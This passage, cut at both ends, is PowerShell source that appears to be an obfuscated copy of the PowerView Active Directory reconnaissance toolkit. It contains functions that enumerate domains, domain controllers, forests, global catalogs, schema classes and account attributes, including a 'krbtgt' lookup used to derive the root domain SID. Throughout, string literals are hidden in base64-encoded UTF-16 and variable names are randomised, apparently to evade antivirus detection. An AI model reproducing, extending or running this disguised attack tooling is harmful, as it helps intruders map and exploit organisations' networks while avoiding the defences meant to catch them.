([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            
${fcc5a08dd51c4cf99ae89f4205bbb673} = New-Object 
System.DirectoryServices.ActiveDirectory.DirectoryContext
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A'))), $Domain)
            try {
                
[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain
(${fcc5a08dd51c4cf99ae89f4205bbb673})
            }
            catch 
{
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQ
BkACAAZABvAG0AYQBpAG4AIAAnACQARABvAG0AYQBpAG4AJwAgAGQAbwBlAHMAIABuAG
8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8Abg
B0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuAC
AAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ACAAOgAgACQAXwA=')))
           
 }
        }
        else {
            try {
                
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain
()
            }
            catch {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAF0AIABFAHIAcgBvAHIAIAByAGUAdAByAGkAZQ
B2AGkAbgBnACAAdABoAGUAIABjAHUAcgByAGUAbgB0ACAAZABvAG0AYQBpAG4AOgAgAC
QAXwA=')))
            }
        }
    }
}
function Get-DomainController 
{
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    
[OutputType
('System.DirectoryServices.ActiveDirectory.DomainController')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True)]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [Switch]
        $LDAP,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
${7246db20e8694d3088b6c98275f5cd6a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('TABEAEEAUAA=')))] -or 
$PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBlAHIAdgBlAHIA')))] = $Server }
            
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOA
A0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')
))
            Get-DomainComputer @7246db20e8694d3088b6c98275f5cd6a
   
     }
        else {
            ${5141d39988144458b175d0cb92f14808} 
= Get-Domain @7246db20e8694d3088b6c98275f5cd6a
            if 
(${5141d39988144458b175d0cb92f14808}) {
                
${5141d39988144458b175d0cb92f14808}.DomainControllers
            }
   
     }
    }
}
function Get-Forest {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('System.Management.Automation.PSCustomObject')]
    [CmdletBinding
()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = 
$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        
$Forest,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
         Write-Verbose $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABVAHMAaQBuAGcAIABhAGwAdABlAHIAbg
BhAHQAZQAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAcwAgAGYAbwByACAARwBlAHQALQBGAG
8AcgBlAHMAdAA=')))
            if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))]) {
                
${48e8cc6d8f9e485da939bcf5631335dc} = $Forest
            }
           
 else {
                ${48e8cc6d8f9e485da939bcf5631335dc} = 
$Credential.GetNetworkCredential().Domain
                Write-
Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbw
BtAGEAaQBuACAAJwAkAEYAbwByAGUAcwB0ACcAIABmAHIAbwBtACAALQBDAHIAZQBkAG
UAbgB0AGkAYQBsAA==')))
            }
            
${f1fb8afc059a4e2782b3749145569fb0} = New-Object 
System.DirectoryServices.ActiveDirectory.DirectoryContext
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA'))), ${48e8cc6d8f9e485da939bcf5631335dc}, 
$Credential.UserName, $Credential.GetNetworkCredential().Password)
   
         try {
                ${5ac14ac8bd0f4825b97882ca331ab89a} = 
[System.DirectoryServices.ActiveDirectory.Forest]::GetForest
(${f1fb8afc059a4e2782b3749145569fb0})
            }
            catch 
{
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQ
BkACAAZgBvAHIAZQBzAHQAIAAnACQAewA0ADgAZQA4AGMAYwA2AGQAOABmADkAZQA0AD
gANQBkAGEAOQAzADkAYgBjAGYANQA2ADMAMQAzADMANQBkAGMAfQAnACAAZABvAGUAcw
AgAG4AbwB0ACAAZQB4AGkAcwB0ACwAIABjAG8AdQBsAGQAIABuAG8AdAAgAGIAZQAgAG
MAbwBuAHQAYQBjAHQAZQBkACwAIAB0AGgAZQByAGUAIABpAHMAbgAnAHQAIABhAG4AIA
BlAHgAaQBzAHQAaQBuAGcAIAB0AHIAdQBzAHQALAAgAG8AcgAgAHQAaABlACAAcwBwAG
UAYwBpAGYAaQBlAGQAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABhAHIAZQAgAGkAbg
B2AGEAbABpAGQAOgAgACQAXwA=')))
                $Null
            }
     
   }
        elseif ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))]) {
            
${f1fb8afc059a4e2782b3749145569fb0} = New-Object 
System.DirectoryServices.ActiveDirectory.DirectoryContext
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA'))), $Forest)
            try {
                
${5ac14ac8bd0f4825b97882ca331ab89a} = 
[System.DirectoryServices.ActiveDirectory.Forest]::GetForest
(${f1fb8afc059a4e2782b3749145569fb0})
            }
            catch 
{
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAEYAbwByAGUAcwB0AF0AIABUAGgAZQAgAHMAcABlAGMAaQBmAGkAZQ
BkACAAZgBvAHIAZQBzAHQAIAAnACQARgBvAHIAZQBzAHQAJwAgAGQAbwBlAHMAIABuAG
8AdAAgAGUAeABpAHMAdAAsACAAYwBvAHUAbABkACAAbgBvAHQAIABiAGUAIABjAG8Abg
B0AGEAYwB0AGUAZAAsACAAbwByACAAdABoAGUAcgBlACAAaQBzAG4AJwB0ACAAYQBuAC
AAZQB4AGkAcwB0AGkAbgBnACAAdAByAHUAcwB0ADoAIAAkAF8A')))
               
 return $Null
            }
        }
        else {
            
${5ac14ac8bd0f4825b97882ca331ab89a} = 
[System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest
()
        }
        if (${5ac14ac8bd0f4825b97882ca331ab89a}) {
        
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
   
             ${ecdb1aa4b1d44f3db781aec3fa687e18} = (Get-DomainUser 
-Identity $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('awByAGIAdABnAHQA'))) -Domain 
${5ac14ac8bd0f4825b97882ca331ab89a}.RootDomain.Name -Credential 
$Credential).objectsid
            }
            else {
                
${ecdb1aa4b1d44f3db781aec3fa687e18} = (Get-DomainUser -Identity 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('awByAGIAdABnAHQA'))) -Domain 
${5ac14ac8bd0f4825b97882ca331ab89a}.RootDomain.Name).objectsid
       
     }
            ${9ddda9862ee14f3b86a47baf42469d04} = 
${ecdb1aa4b1d44f3db781aec3fa687e18} -Split '-'
            
${ecdb1aa4b1d44f3db781aec3fa687e18} = 
${9ddda9862ee14f3b86a47baf42469d04}[0..
$(${9ddda9862ee14f3b86a47baf42469d04}.length-2)] -join '-'
           
 ${5ac14ac8bd0f4825b97882ca331ab89a} | Add-Member NoteProperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UgBvAG8AdABEAG8AbQBhAGkAbgBTAGkAZAA='))) 
${ecdb1aa4b1d44f3db781aec3fa687e18}
            
${5ac14ac8bd0f4825b97882ca331ab89a}
        }
    }
}
function Get-
ForestDomain {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('System.DirectoryServices.ActiveDirectory.Domain')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        
[String]
        $Forest,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
${7246db20e8694d3088b6c98275f5cd6a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${5ac14ac8bd0f4825b97882ca331ab89a} = Get-Forest 
@7246db20e8694d3088b6c98275f5cd6a
        if 
(${5ac14ac8bd0f4825b97882ca331ab89a}) {
            
${5ac14ac8bd0f4825b97882ca331ab89a}.Domains
        }
    }
}
function 
Get-ForestGlobalCatalog {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        
[String]
        $Forest,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
${7246db20e8694d3088b6c98275f5cd6a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${5ac14ac8bd0f4825b97882ca331ab89a} = Get-Forest 
@7246db20e8694d3088b6c98275f5cd6a
        if 
(${5ac14ac8bd0f4825b97882ca331ab89a}) {
            
${5ac14ac8bd0f4825b97882ca331ab89a}.FindAllGlobalCatalogs()
        
}
    }
}
function Get-ForestSchemaClass {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClas
s])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True)]
        [Alias('Class')]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $ClassName,
      
  [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
  
      $Forest,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
${7246db20e8694d3088b6c98275f5cd6a} = @{}
        if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${7246db20e8694d3088b6c98275f5cd6a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        
${5ac14ac8bd0f4825b97882ca331ab89a} = Get-Forest 
@7246db20e8694d3088b6c98275f5cd6a
        if 
(${5ac14ac8bd0f4825b97882ca331ab89a}) {
            if 
($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBsAGEAcwBzAE4AYQBtAGUA')))]) {
       
         ForEach (${733b33864ce04156bcff435abd37ed23} in $ClassName) 
{
                    
${5ac14ac8bd0f4825b97882ca331ab89a}.Schema.FindClass
(${733b33864ce04156bcff435abd37ed23})
                }
            }
  
          else {
                
${5ac14ac8bd0f4825b97882ca331ab89a}.Schema.FindAllClasses()
          
  }
        }
    }
}
function Find-DomainObjectPropertyOutlier {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType
('PowerView.PropertyOutlier')]
    [CmdletBinding
(DefaultParameterSetName = 'ClassName')]
    Param(
        
[Parameter(Position = 0, Mandatory = $True, ParameterSetName = 
'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 
'Group', 'Computer')]
        [String]
        $ClassName,
        
[ValidateNotNullOrEmpty()]
        [String[]]
        
$ReferencePropertySet,
        [Parameter(ValueFromPipeline = $True, 
Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        
[PSCustomObject]
        $ReferenceObject,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
  
      $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias
('ADSPath')]
        [String]
        $SearchBase,
        
[ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        
[String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 
'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        
[ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 
200,
        [ValidateRange(1, 10000)]
        [Int]
        
$ServerTimeLimit,
        [Switch]
        $Tombstone,
        
[Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${af360673fb424ae1b6b6b3cb7c0ec244} = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAcABsAGEAeQBuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwBpAHYAZQBuAG4AYQBtAGUA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAGYAZgA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABvAGMAawBvAHUAdAB0AGkAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdA
B5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('bgBhAG0AZQA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAB3AGQAbABhAHMAdABzAGUAdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),'sn',
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAGUAcgBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        
${0aa22354c6b24241a84a3c7b3141d794} = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),'cn',
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZwByAG8AdQBwAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBlAG0AYgBlAHIA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwB5AHMAdABlAG0AZgBsAGEAZwBzAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        
${ee84ac222f5542eb94d45f21c324bb31} = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAGYAZgA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABvAGMAYQBsAHAAbwBsAGkAYwB5AGYAbABhAGcAcwA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdA
B5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('bgBhAG0AZQA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYw
BrAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cAB3AGQAbABhAHMAdABzAGUAdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
